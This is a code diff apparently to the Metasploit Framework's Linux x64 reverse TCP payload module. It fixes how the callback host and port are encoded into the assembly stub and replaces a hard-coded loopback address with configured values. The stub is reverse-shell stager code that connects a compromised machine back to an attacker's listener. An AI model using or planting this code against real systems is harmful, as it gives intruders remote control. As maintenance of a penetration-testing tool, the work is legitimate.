@@ -85,8 +85,8 @@ module Payload::Linux::ReverseTcp
     # TODO: reliability is coming
     retry_count  = [opts[:retry_count].to_i, 1].max
     reliable     = opts[:reliable]
-    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
-    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    encoded_port = "%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
+    encoded_host = "%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
 
     asm = %Q^
         xor    rdi, rdi
@@ -117,7 +117,7 @@ module Payload::Linux::ReverseTcp
         js failed
 
         xchg   rdi, rax
-        mov    rcx, 0x100007fb3150002
+        mov    rcx, 0x#{encoded_host}#{encoded_port}
         push   rcx
         mov    rsi, rsp
         push   0x10
